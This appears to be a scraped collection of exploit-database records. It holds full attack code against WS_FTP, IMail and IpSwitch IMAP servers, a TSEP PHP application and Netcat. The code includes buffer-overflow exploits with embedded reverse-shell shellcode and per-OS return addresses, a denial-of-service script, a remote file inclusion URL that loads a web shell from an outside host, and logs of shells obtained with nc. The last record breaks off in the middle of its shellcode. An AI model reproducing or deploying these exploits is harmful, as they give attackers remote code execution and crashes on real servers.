C:\>ws_exp 1 192.168.0.1 4444
[*] WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit
[*] Coded by h07 <h07@interia.pl>
[+] Listening on 21
[+] Connection accepted from 192.168.0.3
[+] Client request: USER h07
[+] Client request: PWD
[+] Client request: SYST
[+] Client request: HELP
[+] Client request: PASV
[+] Sending buffer: OK
[*] Press enter to quit
C:\>nc -v -l -p 4444
listening on [any] 4444 ...
connect to [192.168.0.1] from (UNKNOWN) [192.168.0.3] 2809: NO_DATA
Microsoft Windows 2000 [Wersja 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.
C:\Program Files\WS_FTP>
typedef struct
char os_name[32];
unsigned long ret;
} target;
char shellcode[] =
win32 reverse shellcode (thx metasploit.com)
bad chars: 0x00 0x20 0x0a 0x0d 0x28 0x29
""\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x87""
""\x61\xbc\xd8\x83\xeb\xfc\xe2\xf4\x7b\x0b\x57\x95\x6f\x98\x43\x27""
""\x78\x01\x37\xb4\xa3\x45\x37\x9d\xbb\xea\xc0\xdd\xff\x60\x53\x53""
""\xc8\x79\x37\x87\xa7\x60\x57\x91\x0c\x55\x37\xd9\x69\x50\x7c\x41""
""\x2b\xe5\x7c\xac\x80\xa0\x76\xd5\x86\xa3\x57\x2c\xbc\x35\x98\xf0""
""\xf2\x84\x37\x87\xa3\x60\x57\xbe\x0c\x6d\xf7\x53\xd8\x7d\xbd\x33""
""\x84\x4d\x37\x51\xeb\x45\xa0\xb9\x44\x50\x67\xbc\x0c\x22\x8c\x53""
""\xc7\x6d\x37\xa8\x9b\xcc\x37\x98\x8f\x3f\xd4\x56\xc9\x6f\x50\x88""
""\x78\xb7\xda\x8b\xe1\x09\x8f\xea\xef\x16\xcf\xea\xd8\x35\x43\x08""
""\xef\xaa\x51\x24\xbc\x31\x43\x0e\xd8\xe8\x59\xbe\x06\x8c\xb4\xda""
""\xd2\x0b\xbe\x27\x57\x09\x65\xd1\x72\xcc\xeb\x27\x51\x32\xef\x8b""
""\xd4\x22\xef\x9b\xd4\x9e\x6c\xb0\x87\x61\xbc\xd8\xe1\x09\xbc\xd8""
""\xe1\x32\x35\x39\x12\x09\x50\x21\x2d\x01\xeb\x27\x51\x0b\xac\x89""
""\xd2\x9e\x6c\xbe\xed\x05\xda\xb0\xe4\x0c\xd6\x88\xde\x48\x70\x51""
""\x60\x0b\xf8\x51\x65\x50\x7c\x2b\x2d\xf4\x35\x25\x79\x23\x91\x26""
""\xc5\x4d\x31\xa2\xbf\xca\x17\x73\xef\x13\x42\x6b\x91\x9e\xc9\xf0""
""\x78\xb7\xe7\x8f\xd5\x30\xed\x89\xed\x60\xed\x89\xd2\x30\x43\x08""
""\xef\xcc\x65\xdd\x49\x32\x43\x0e\xed\x9e\x43\xef\x78\xb1\xd4\x3f""
""\xfe\xa7\xc5\x27\xf2\x65\x43\x0e\x78\x16\x40\x27\x57\x09\x4c\x52""
""\x83\x3e\xef\x27\x51\x9e\x6c\xd8"";
char buffer[BUFF_SIZE];
target list[] =
""XP SP2 Polish"",
0x7d16887b, //JMP ESI
""2000 SP4 Polish"",
0x776f2015, //JMP ESI
""XP SP2 English"",
0x7cb9e082, //JMP ESI
""2000 SP4 English"",
0x7848a5f1, //JMP ESI
""XP SP2 German"",
0x7ca96834  //JMP ESI
void config_shellcode(unsigned long ip, unsigned short port)
memcpy(&shellcode[184], &ip, 4);
memcpy(&shellcode[190], &port, 2);
int main(int argc, char *argv[])
WSADATA wsa;
int sock, cl, len, os, r_len, i,
a = (sizeof(list) / sizeof(target)) - 1;
unsigned long connectback_IP, eip;
unsigned short connectback_port;
struct sockaddr_in server, client;
printf(""\n[*] WS_FTP LE 5.08 (PASV response) 0day buffer overflow exploit\n"");
printf(""[*] Coded by h07 <h07@interia.pl>\n"");
if(argc < 4)
printf(""[*] Usage: %s <system> <connectback_IP> <connectback_port>\n"", argv[0]);
printf(""[*] Sample: %s 0 192.168.0.1 4444\n"", argv[0]);
printf(""[*] Systems..\n"");
for(i = 0; i <= a; i++)
printf(""[>] %d: %s\n"", i, list[i].os_name);
return 1;
WSAStartup(MAKEWORD(2, 0), &wsa);
os = atoi(argv[1]);
if((os < 0) || (os > a))
printf(""[-] Error: unknown target %d\n"", os);
return -1;
eip = list[os].ret;
connectback_IP = inet_addr(argv[2]) ^ (ULONG)0xd8bc6187;
connectback_port = htons(atoi(argv[3])) ^ (USHORT)0xd8bc;
config_shellcode(connectback_IP, connectback_port);
if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
printf(""[-] Socket error\n"");
return -1;
server.sin_family = AF_INET;
server.sin_addr.s_addr = htonl(INADDR_ANY);
server.sin_port = htons(PORT);
bind(sock, (struct sockaddr *) &server, sizeof(server));
listen(sock, 1);
printf(""[+] Listening on %d\n"", PORT);
len = sizeof(client);
cl = accept(sock, (struct sockaddr *) &client, &len);
printf(""[+] Connection accepted from %s\n"", inet_ntoa(client.sin_addr));
send(cl, ""200 evil server ready :>\r\n"", 26, 0);
for(i = 0; i <= 3; i++)
memset(buffer, 0x00, BUFF_SIZE);
recv(cl, buffer, BUFF_SIZE - 1, 0);
printf(""[+] Client request: %s"", buffer);
send(cl, RESPONSE, strlen(RESPONSE), 0);
memset(buffer, 0x00, BUFF_SIZE);
recv(cl, buffer, BUFF_SIZE - 1, 0);
printf(""[+] Client request: %s"", buffer);
r_len = 1011;
memset(buffer, 0x90, BUFF_SIZE);
memcpy(buffer, ""200 \x31\xc0"", 6);
memcpy(buffer + 6, shellcode, sizeof(shellcode) - 1);
*((unsigned long*)(&buffer[r_len])) = eip;
memcpy(buffer + (r_len + 4), ""\r\n\x00"", 3);
if(send(cl, buffer, strlen(buffer), 0) != -1)
printf(""[+] Sending buffer: OK\n"");
else
printf(""[-] Sending buffer: failed\n"");
printf(""[*] Press enter to quit\n"");
getchar();
return 0;"
2006-08-02,WebApps,PHP,beford,TSEP 0.942,'colorswitch.php' Remote File Inclusion,"http://hax.com/tsep/include/colorswitch.php?tsep_config[absPath]=http://remotefile/?
# milw0rm.com [2006-08-02]","Script: TSEP <= 0.942
URL:  www.tsep.info
Discovered: beford <xbefordx gmail com>
Comments: ""register_globals"" must be enabled duh.
document.this != http://www.milw0rm.com/exploits/2098
Vulnerable Files/Code:
./tsep.0942/include/colorswitch.php?tsep_config[absPath]=http://rst.void.ru/download/r57shell.txt?
./tsep.0942/include/printpagedetails.php => require_once(
$tsep_config[""absPath""].""/include/convert_htmlent.php"" );
./tsep.0942/include/ipfunctions.php => require_once(
$tsep_config[""absPath""].""/include/IPv6.php"" );
./tsep.0942/include/contentimages.class.php => require_once(
$tsep_config[""absPath""].""/include/contentimages.class.php"" );
./tsep.0942/include/configfunctions.php => require_once(
$tsep_config[""absPath""].""/include/mmexfunctions.php"" );
./tsep.0942/include/log.class.php => require_once(
$tsep_config[""absPath""].""/include/tseptrace.php"" );
Not-leet-enough: ""Powered By TSEP""
POC:"
2004-11-29,DoS,Windows,Reed Arvin,Ipswitch WS_FTP Server 5.03,'RNFR' Buffer Overflow,"#===== Start WS_FTP_Overflow.pl =====
# Usage: WS_FTP_Overflow.pl <ip> <ftp user> <ftp pass>
#        WS_FTP_Overflow.pl 127.0.0.1 hello moto
# WS_FTP Server Version 5.03, 2004.10.14
# Download:
# http://www.ipswitch.com/
#===== End WS_FTP_Overflow.pl =====
# milw0rm.com [2004-11-29]","use IO::Socket;
use strict;
my($socket) = """";
if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
PeerPort => ""21"",
Proto    => ""TCP""))
print ""Attempting to kill WS_FTP Server service at $ARGV[0]:21..."";
sleep(1);
print $socket ""USER $ARGV[1]\r\n"";
sleep(1);
print $socket ""PASS $ARGV[2]\r\n"";
sleep(1);
print $socket ""PORT 127,0,0,1,18,12\r\n"";
sleep(1);
print $socket ""RNFR "" . ""A"" x 768 . ""\r\n"";
close($socket);
else
print ""Cannot connect to $ARGV[0]:21\n"";"
2005-08-01,Remote,Linux,kingcope,IPSwitch IMail Server 8.15,IMAPD Remote Code Execution,"# IpSwitch IMAIL Server IMAPD Remote r00t Exploit by kcope
# June 2005
# Confidential!
# 316 bytes
# milw0rm.com [2005-08-01]","use IO::Socket;
$cbsc =
""\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA""
.""\xEB\x05\xE8\xEB\xFF\xFF\xFF""
.""\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49""
.""\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2""
.""\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49""
.""\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2""
.""\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92""
.""\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2""
.""\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1""
.""\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69""
.""\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B""
.""\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93""
.""\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D""
.""\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE""
.""\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83""
.""\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1""
.""\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49""
.""\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01""
.""\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7""
.""\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68""
.""\xA2\x25\xBB\x04\xBB"";
$numtargets = 12;
@targets =
[""Ipswitch IMAIL Server IMAPD 7.04"", ""\x5F\x2E\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 7.07"", ""\x3F\x34\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 7.13"", ""\x33\x36\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 7.15"", ""\x53\x36\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 8.00/8.01/8.02/8.03"", ""\x53\x36\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 8.04"", ""\x73\x36\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 8.05 NO HOTFIX"", ""\xB3\x36\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 8.05HF1/8.05HF2/8.05HF3"", ""\x03\x37\x01\x10"", 1],
[""Ipswitch IMAIL Server IMAPD 8.10"", ""\xfe\xf9\x01\x10"", 0],
[""Ipswitch IMAIL Server IMAPD 8.11"", ""\x8e\x02\x02\x10"", 0],
[""Ipswitch IMAIL Server IMAPD 8.12/8.13/8.14"", ""\x2e\x0b\x02\x10"", 0],
[""Ipswitch IMAIL Server IMAPD 8.15"", ""\x0e\x0e\x02\x10"", 0]
print ""IpSwitch IMAIL Server IMAPD Remote r00t Exploit by kcope VER1\n"";
if ($#ARGV ne 3) {
print ""usage: imail.pl target targettype yourip yourport\n\n"";
for ($i=0; $i<$numtargets; $i++) {
print "" ["".$i.""]..."". $targets[$i][0]. ""\r\n"";
exit(0);
$tt=$ARGV[1];
$ret = $targets[$tt][1];
$cbip=$ARGV[2];
$cbport=$ARGV[3];
($a1, $a2, $a3, $a4) = split(//, gethostbyname(""$cbip""));
$a1 = chr(ord($a1) ^ 0xc2);
$a2 = chr(ord($a2) ^ 0xc2);
$a3 = chr(ord($a3) ^ 0xc2);
$a4 = chr(ord($a4) ^ 0xc2);
substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);
($p1, $p2) = split(//, reverse(pack(""s"", $cbport)));
$p1 = chr(ord($p1) ^ 0xc2);
$p2 = chr(ord($p2) ^ 0xc2);
substr($cbsc, 118, 2, $p1 . $p2);
print ""[*] $ARGV[0]\n"";
print ""[*] "".$targets[$tt][0].""\n"";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
PeerPort => '143',
Proto    => 'tcp');
$findsc=""\x83\xc0\x04\x81\x38\x53\x45\x58\x59\x74\x02\xeb\xf3\x83\xc0\x04\xff\xe0"";
if ($targets[$tt][2] eq 0) {
$a=""@"" . ""SEXY"" . $cbsc . ""A"" x 358 . ""\xeb\x04"" . $ret . ""AAAA"" . $findsc . ""A"" x 1000;# IMAIL > 8.00
if ($targets[$tt][2] eq 1) {
$a=""@"" . ""SEXY"" . $cbsc . ""A"" x 366 . ""\xeb\x04"" . $ret . ""AAAA"" . $findsc . ""A"" x 1000;# IMAIL 8.00
print $sock ""a001 LOGIN \"""" . $a . ""\"" password\r\n"";
while(<$sock>) {
print;"
2005-06-07,Remote,Windows,nolimit,IPSwitch IMAP Server,LOGON Remote Stack Overflow,"//    /     _      /     /    _/     /     /     / /   / \_____      |/     /
#include <stdio.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,""ws2_32"")
//special stuff
// un-crypted shellcode that we'll fill our retn values, then encode.
//160 above, ip next 4 bytes then, pass 2 theres port
//modified encoded alpha num SUB ECX, 2E8 JMP ECX
//set ip/port specified. Probably could have done this easier, but whatever.
//done formatting, now lets encode it.
//form buffer here.
//buffer formed
//Below here, all code is modified code from ALPHA 2: Zero-tolerance by Berend-Jan Wever.
//  aka Skylined  <skylined@edup.tudelft.nl>. Hats off to him.
//ecx ascii decoder.
#define ecx_mixedcase_ascii_decoder""IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI""
// shellcode ptr & size
//first, create a big enough shellcode memory section
// encoding AB -> CD 00 EF 00
// E is arbitrary as long as EF is a valid character
// normal code uses xor, unicode-proof uses ADD.
// AB ->
// C is arbitrary as long as CD is a valid character
//edit, use curChar ptr to strncpy it.
//printf(""%c%c"", (C<<4)+D, (E<<4)+F);
// milw0rm.com [2005-06-07]","IpSwitch IMAP Server LOGON stack overflow.
Software Hole discovered by iDEFENSE
POC written by nolimit and BuzzDee
First, some information for the few of you that know how this stuff works.
The reason you see no SP2 or 2003 offsets is because of Windows SEH checks.
Thats right, in this one situation, They've stopped hackers from exploiting the machine.
At least with as much research as I care to do. The problem lies in the
fact that only alpha numeric memory addresses can be used in this exploit.
So what lies within the few regions of memory that is alpha numeric safe? Only system
DLLs.(Well also a 7000 byte TEB block section, which doesn't really produce much either).
So any SEH address overwritten that points to a system DLL  will fail past Windows XP SP2.
From what I've read and the few tricks I've tried, Theirs no way currently to get around the
protection In my situation.
For the sharp ones, you've maybe noticed that XP SP1 isn't an offset. This is because
of two reasons, While I've developed along with skylined an alpha numeric shellcode
to handle the stack protections in Windows XP/2K3, I don't think he's ready to release
it yet.So, when It does come around, you can use that and re-adjust the stack accordingly
for proper exploitation of SP1.
The size we have on the stack is too small for a bindshell, but big enough for a reverse shell!
So I use ALPHA2's decoder and encoder (modified) to write info to reverse shell, then encode it.
visit http://www.edup.tudelft.nl/~bjwever/documentation_alpha2.html.php for more information.
Now, for the ""impact assessment"".
Because this doesn't work on SP2 / 2003, the 53 million users that use Imail should
mostly be safe from complete ownage. But, Do not let this fact let you not patch your
server! This exploit, sent with any offset, will still crash your IMAP server!
With that said, Thier is still a small amount of servers online that run one of these
targetted offsets, and therefore can be exploited. I hope this Proof Of Concept is the
push administrators need to patch their software.
For Da Skiddies: this exploit is teh oww kay. I g0t a f3w shells0rs.
C:\HACKING\tools>nc -vv -l -p 3333
listening on [any] 3333 ...
DNS fwd/rev mismatch: 2kvm != 2kvm.launchmodem.com
connect to [192.168.1.95] from 2kvm [192.168.1.93] 1078
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.
C:\WINNT\system32>_
Questions? Comments?
nolimit@coreiso.org
-  - ---.
.----------------------. |                      ·
| :::::::::''''':::::: | !                   · /
l  '''''           '': | `                  /_/
.--- --·X·----------- -- -  -  | - c o r e i s o   __ \  ·   -  - ---.
|       !                      :                  /_/\ \/            |
|                                        _\ \ \              |
S! /\____  |  _ ______/\ __ ______/\ __ ______/\   / /\_\/ _______ /\______
_/    _/_____\    _    \__    _    \__    _    \_/ /  \ _/  ____//   _    \_
_/     /      /     /    _/     \    _/\    ______/\/   /:     |/      /     /|
\ ___________/\ _________\ _____|\______\ __________\  /||     _______________|
\/  .       . \/         \/        .    \/     /_/   / |______\          .
|       |                      .          _\ \  /                    |
|       |                      l         /_/\_\/                     |
`------ | ------- -- -   - ---·X·-- -  -_\ \ \       -   -  - -- ----'
. | :.            .....  !.      / /\_\/
: | :::::......::::::::: |:     / /. \
| `----------------------'|    /_//  /    www.coreiso.org
`--- -  -                 |    \ \  /     Innovation, not imitation.
-  - ---'     \_\/
void cmdshell (int sock);
long gimmeip(char *hostname);
char buffer[2500];
char* alphaEncodeShellcode(char *shellcode, int size);
char unEncShellcode[]=
""\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45""
""\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49""
""\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d""
""\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66""
""\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61""
""\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40""
""\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32""
""\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6""
""\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09""
""\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68""
""\x64\x64\x64\x64\x66\x68\x0d\x05\x66\x53\x89\xe1\x95\x68\xec\xf9""
""\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68""
""\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3""
""\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab""
""\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51""
""\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6""
""\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6""
""\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"";
char jmpBack[]=
""VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089""
""IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIoqYyKHTB30WpyoKQAPA"";
int paddingSize; // change when changing shellcode. 676 bytes - shellcodesize = this.
char jmp2KSP4[] = ""\x40\x43\x44\x78""; //JMP EBX 2000 SP4 TESTED
char jmp2KSP3[] = ""\x40\x23\x44\x78""; //JMP EBX 2000 SP3
char jmp2KSP2[] = ""\x40\x21\x46\x78""; //JMP EBX 2000 SP2
char jmp2KSP1[] = ""\x62\x54\x30\x77""; //POP POP RETN 2000 SP1 (no jmp ebx)
char jmp2KSP0[] = ""\x6C\x30\x6B\x77""; //JMP EBX 2000 SP0
char jmpXPSP0[] = ""\x63\x4F\x60\x77""; //JMP EBX WinXP SP0 no SEH XOR prot so JMP EBX is ok
int main(int argc,char *argv[])
WSADATA wsaData;
struct sockaddr_in targetTCP;
int sockTCP;
unsigned short port = 143;
long ip;
if(argc < 5)
printf(""IpSwitch IMAP server Remote Stack Overflow.\n""
""This exploit uses a reverse shell payload.\n""
""Usage: %s [retnaddr] [retport] [target] [address] <port_to_exploit>\n""
"" eg: %s 192.168.1.94 1564 2 192.168.1.95\n""
""Targets:\n""
""1. Windows XP SP 0.\n2. Windows 2000 SP4\n3. Windows 2000 SP3\n""
""4. Windows 2000 SP2\n5. Windows 2000 SP1\n6. Windows 2000 SP0\n""
""Read comments in source code for more info.\n""
""Coded by nolimit@CiSO and BuzzDee.\n"",argv[0],argv[0]);
return 1;
if(argc==6)
port = atoi(argv[5]);
WSAStartup(0x0202, &wsaData);
printf(""[*] Target:\t%s \tPort: %d\n\n"",argv[4],port);
ip=gimmeip(argv[4]);
targetTCP.sin_family = AF_INET;
targetTCP.sin_addr.s_addr = ip;
targetTCP.sin_port = htons(port);
unsigned long revIp = gimmeip(argv[1]);
unsigned long *revPtr = (unsigned long *)&unEncShellcode;
revPtr = revPtr + (160/4); //go to ip place, it adds by 4, and it's 160 bytes away.
*revPtr = revIp;
char *portPtr = (char *)revPtr + 6; //ptr + 2 bytes past
int rPort = atoi(argv[2]);
char *revPortPtr = (char *)&rPort;
memcpy(portPtr,revPortPtr+1,1);
memcpy(portPtr+1,revPortPtr,1);
char *shellcode = alphaEncodeShellcode(unEncShellcode,sizeof(unEncShellcode));
paddingSize = 676 - strlen(shellcode);
memset(buffer,'\x00',2500);
strcpy(buffer,""A001 LOGIN user@"");
memset(buffer+16,'\x41',paddingSize); //INC ECX nopslide
strcat(buffer,shellcode);
strcat(buffer,""r!s!""); //jmp over SE handler
switch(atoi(argv[3]))
case 1:
printf(""[*] Targetting Windows XP SP 0..\n"");
strcat(buffer,jmpXPSP0);
break;
case 2:
printf(""[*] Targetting Windows 2000 SP4..\n"");
strcat(buffer,jmp2KSP4);
break;
case 3:
printf(""[*] Targetting Windows 2000 SP3..\n"");
strcat(buffer,jmp2KSP3);
break;
case 4:
printf(""[*] Targetting Windows 2000 SP2..\n"");
strcat(buffer,jmp2KSP2);
break;
case 5:
printf(""[*] Targetting Windows 2000 SP1..\n"");
strcat(buffer,jmp2KSP1);
break;
case 6:
printf(""[*] Targetting Windows 2000 SP0..\n"");
strcat(buffer,jmp2KSP0);
break;
default:
printf(""Target error.\n"");
return 1;
break;
memset(buffer+strlen(buffer),'\x41',29);
strcat(buffer,jmpBack); //decodes to jmp back to top part of buffer
memset(buffer+strlen(buffer),'\x41',1323);
strcat(buffer,"" nolimits\r\n"");
if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
printf(""[x] Socket not initialized! Exiting...\n"");
WSACleanup();
return 1;
printf(""[*] Socket initialized...\n"");
if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
printf(""[*] Connection to host failed! Exiting...\n"");
WSACleanup();
exit(1);
printf(""[*] Sending  buffer.\n"");
Sleep(1000);
if (send(sockTCP, buffer, strlen(buffer),0) == -1)
printf(""[x] Failed to inject packet! Exiting...\n"");
WSACleanup();
return 1;
Sleep(1000);
closesocket(sockTCP);
WSACleanup();
printf(""Exploit sent. Reverse Shell should be comming if everyhing worked.\n"");
return 0;
long gimmeip(char *hostname)
struct hostent *he;
long ipaddr;
if ((ipaddr = inet_addr(hostname)) < 0)
if ((he = gethostbyname(hostname)) == NULL)
printf(""[x] Failed to resolve host: %s! Exiting...\n\n"",hostname);
WSACleanup();
exit(1);
memcpy(&ipaddr, he->h_addr, he->h_length);
return ipaddr;
char* alphaEncodeShellcode(char *shellcode, int size)
int   i, input, A, B, C, D, E, F;
char* valid_chars=""0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"";
char *encShellcode = (char *) malloc(sizeof((ecx_mixedcase_ascii_decoder) + (size * 2)));
strcpy(encShellcode,ecx_mixedcase_ascii_decoder);
char buff[4];
int z=0;
for(;z < size;z++)
A = (shellcode[z] & 0xf0) >> 4;
B = (shellcode[z] & 0x0f);
F = B;
i = rand() % strlen(valid_chars);
while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
E = valid_chars[i] >> 4;
D =  0 ? (A-E) & 0x0f : (A^E);
i = rand() % strlen(valid_chars);
while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
C = valid_chars[i] >> 4;
sprintf(buff,""%c%c"",(C<<4)+D, (E<<4)+F);
strcat(encShellcode,buff);
return encShellcode;"
2004-12-26,Remote,Windows,class101,Netcat 1.1,'-e' Switch Remote Buffer Overflow,"#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include ""winsock2.h""
#pragma comment(lib, ""ws2_32"")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif
//   GENERIC callback cmd execution shellcode
//   by Brett Moore @ Security-Assessment.com
//   205 bytes + 8 bytes to bypass null byte problem spoke ealier. bmoore
//             + 6 nop added to avoid bad char ""\x0A"". class101
//             + 1 bytes of CMP&JMP instruction added to fix an important bug. class101
//                 (shellcode was spawning a shell if you use it locally,
//                 but access violation trying to spawn a shell on remote ip, now fixed.)
//             = 220 bytes
#ifdef WIN32
#endif
#ifndef WIN32
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
#endif
#ifdef WIN32
#else
#endif
#ifdef WIN32
#else
#endif
#ifdef WIN32
#endif
// milw0rm.com [2004-12-26]","Netcat v1.1, ""-e"" Switch, Remote Buffer Overflow Exploit v0.1
Homepage..........: http://www.securityfocus.com/tools/139/scoreit
Affected versions.: v1.1
Fix...............: Actually none, Hobbit is warned 1 month+ ago, and looks like
to not act, we let him to spread a backdoor :)
Risk..............: Highly critical.
-Almost everything loaded as ""nc ... -e ..."" is vulnerable
-Educational tools such as the uw-imapd (http://www.washington.edu/imap/) contains no port listener,
if it's loaded with netcat (ie: nc -L -p 143 -t -e imapd.exe
25  -t -e pop3d.exe etc..vulnerable..)
this small example show you the large impact of this hole.
-Tools build on netcat , I guess are vulnerable , such as the netcat with
authentification or others tools based on netcat without a security check on src.
-Next time you run netcat -e , be sure of what you run because as said Hobbit,
the ""-e"" switch is really DANGEROUS!! :DDD
Compilation.......: 101_ncat.cpp ......... Win32 (MSVC,cygwin)
101_ncat.c ........... Linux (FreeBSD,etc..)
Greetings.........: Nima Majidi, Behrang Fouladi (cool teammates ;p)
DiabloHorn, kimatrix (KD-Team guys)
Nicolas Waisman, MMiller(skape), H.D Moore, BJWever (for the help)
Brett Moore (for all help and specially there
for suggesting me that way of MSVCRT.system call
; call system()
mov eax,1656E64h  ; mov cmd + 01010101 to eax
sub eax,01010101h ; sub 01010101
push eax ; Push cmd on stack with our null byte :)
push esp ; Location to cmd
call ebp ; Call system()
via that way you can push on the stack ""\x00""cmd without
breaking your payload.
Because in the public shellcode that he published on mailinglist
; Call system()
push  20646D63h  ; Push cmd on stack, null exists from above
push  esp    ; Location to cmd
call  ebp    ; Call system()
Sure it's smaller to push direclty ""\x20""cmd but
MSVCRT.system was also grabbing invalid unicode chars
before ""\x20""cmd including esp pointing to cmd (windows bug ?:>)(on w2k sp4 server).
Else to bypass a bad char , I do a small change ,adding 6 nop,
to kick out ""\x0A"" bugging there for netcat and prolly more.
This to finally say that the size of the shellcode is now 220 bytes instead
of 205 (still awesome for a reversecmd generic win32 shellcode)
Tested working on W2k SP4,XP all SP. Excellent job by Brett Moore wich I throw all credits
because this shellcode is the brain of that exploit ;)
Extra.............: !All tests were made on nc.exe from http://www.securityfocus.com/tools/139/scoreit!
!All tests were made loading netcat: nc -L -p 143 -t -e c:\imapd.exe!
(hoping the processus wont change if you load differently netcat, I dont think, else update urself!
!See in the code if you need the shellcode in ASM format, really useful peace of code, thanx to bmoore and me!
!Don't use ip with #0 as '127.0.0.1' , this will break the payload.
Bug discovery.....: class101
Exploit code......: class101 at www.hat-squad.com - dfind.kd-team.com - #n3ws EFnet
Quizz.............: Wich crew is enough stupid to spread perl worm codes ?
K _ O _ i _
easy ;>
char scode[] =
""\xEB\x21\x02\x01\x00\x00\x00\x00\x00\x00\x01\x4A\x36\x4D\x53\x56""
""\x43\x52\x54\x01\x2A\x42\xD4\x8A\x57\x53\x32\x5F\x33\x32\x01\x7C""
""\x81\x2C\x4E\x68\x5F\x57\xC3\xAC\xFF\xD4\xBE\x0C\xF0\xFD\x7F\xAD""
""\xFF\x36\x8B\x70\x1C\xAD\x8B\x50\x08\x6A\xF8\x8D\x5F\xF8\x54\x5D""
